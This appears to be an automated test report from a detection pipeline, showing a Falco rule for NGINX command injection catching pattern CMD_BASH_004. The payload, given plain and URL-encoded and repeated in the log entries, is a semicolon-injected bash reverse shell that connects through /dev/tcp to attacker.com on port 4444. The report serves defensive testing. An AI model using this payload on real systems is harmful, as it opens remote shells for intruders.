name: test_e2e_with_logs[322_CMD_BASH_004]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_004` |
| **Name** | Bash TCP shell via exec |
| **Category** | CMDI |
| **Subcategory** | bash_specific |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; exec 5<>/dev/tcp/attacker.com/4444;cat <&5 | while read line; do $line 2>&5 >&5; done`
- **Encoded**: `%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~43000ms
- **Timestamp**: 13:45:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772113534999-sx02n4 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772113534999-sx02n4 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1

**Falco Log Entry**:
```
13:45:34.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1772113534999-sx02n4 pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1
```
